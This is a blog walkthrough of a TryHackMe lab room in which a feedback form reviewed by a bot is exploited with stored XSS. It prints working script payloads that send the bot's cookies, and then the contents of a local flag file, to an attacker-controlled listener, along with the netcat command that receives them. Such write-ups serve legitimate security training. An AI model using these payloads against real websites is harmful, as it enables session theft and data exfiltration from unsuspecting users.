---
title: The Sticker Shop - TryHackMe - Walkthrough
date: 2024-12-01 08:00:00 +0200
categories: [TryHackMe]
tags: [shop,xss,feedback,easy]
description: Simple room, just about exploiting a XSS vulnerability
image:
  path: /assets/blog/The-Sticker-Shop/Room.png
  alt: Lookup Room image
---

## Description

> Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!
>
> Can you read the flag at `http://10.10.114.115:8080/flag.txt`?

## Simple exploit

For this room I didn't even start with an initial `nmap` scan, I went straight to port 8080 and visited the page.

![](/assets/blog/The-Sticker-Shop/website.png)

I noticed the feedback form and visited that page.

![](/assets/blog/The-Sticker-Shop/feedback.png)

If we enter some feedback and then press the Submit button, we get this response:

> Thanks for your feedback! It will be evaluated shortly by our staff


This sounds like there could be a bot always checking the new feedback data, which may lead us to XSS...

I started with my standart XSS payload:
```html
<script>fetch("http://10.14.78.229:4444/"+document.cookie);</script>
```
To receive an incoming connection I started a listener:
```sh
nc -lvnp 4444
```

Suddenly I got back the connection. That looks promising, but there is no cookie so we can't just add the cookie to our cookies and view the flag, apparently the flag is only visible for the bot.

![](/assets/blog/The-Sticker-Shop/connection.png)

The next idean in my head was that we could fetch the cookie in the Javascript in our XSS payload and send the contents of the page back to us.
This is how we can fetch a website in JS described by ChatGPT:
```js
fetch('https://example.com') // Replace with the URL you want to fetch
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.text(); // Use .json() if expecting a JSON response
  })
  .then(data => {
    console.log(data); // Logs the page's HTML or response body
  })
  .catch(error => {
    console.error('Error fetching the page:', error);
  });
```

Let's modify this to build our own payload. I first removed all the error handling cause this doesn't help. Then I added our own fetch with the data to the payload:
```js
fetch('http://127.0.0.1:8080/flag.txt').then(response => {
  return response.text();
  }).then(data => {
    fetch("http://10.14.78.229:4444/"+data);
  })
```
If we make this a one-liner, that we don't get any errors that way, the payload looks like this:
```html
<script>fetch('http://127.0.0.1:8080/flag.txt').then(response => {return response.text();}).then(data => {fetch("http://10.14.78.229:4444/"+data);})</script>
```

We now can send the payload in the XSS form and try to get the flag.

![](/assets/blog/The-Sticker-Shop/flag.png)

We now have the flag, if you wan't the flag now in a clean format, you can take everything after the `/` and paste it into CyberChef, then you can URL decode it to the flag.

In my opinion this is a nice room in which you can easily practice XSS and learn more to craft your own payloads.
